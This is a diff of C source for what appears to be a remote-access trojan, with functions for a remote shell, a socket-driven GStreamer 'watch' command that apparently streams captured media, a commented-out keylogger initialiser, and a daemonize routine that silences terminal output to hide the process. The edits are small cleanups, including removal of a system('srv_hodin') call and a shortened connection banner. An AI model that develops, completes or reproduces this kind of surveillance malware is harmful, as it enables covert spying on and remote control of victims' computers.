@@ -86,7 +86,7 @@ int main(int argc, char*argv[])
     //fedora_keylogger_init();
 
     /* Initialize GStreamer */
-    gst_init (&argc, &argv);
+    gst_init(&argc, &argv);
 
     dispatch_modules(argv);
 
@@ -741,7 +741,7 @@ void *start_remote_shell(char *argv[])
     size_t data_len = 0;
     int ret = 0;
 
-    char connected_msg[] = "You're now connected to the server ...\r\nWARNING: USE quit COMMAND WHEN FINISHED\r\n";
+    char connected_msg[] = "You're now connected to the server ...\r\n";
     int connected_msg_len = strlen(connected_msg) + 1;
 
 
@@ -922,8 +922,6 @@ void execute_watch_cmd()
     GMainLoop *main_loop;
     CustomData data;
 
-    system("srv_hodin");
-
     if(recv(csock, (char*)&len_watch_cmd, sizeof(len_watch_cmd), 0) == SOCKET_ERROR)
     {
         error("recv() len_watch_cmd", "execute_watch_cmd()");
@@ -1047,7 +1045,6 @@ void cb_message(GstBus *bus, GstMessage *msg, CustomData *data)
 }
 
 
-
 void daemonize()
 {
 
@@ -1077,7 +1074,7 @@ void daemonize()
     umask(0);
 
 
-    /**  Redirect standard I/O for cancel all user terminal messages  **/
+    /**  Redirect standard I/O for cancel all user terminal messages **/
     if(freopen("/dev/null", "r", stdin) == NULL )
     {
         error("freopen() stdin", "daemonize_keylogger()");
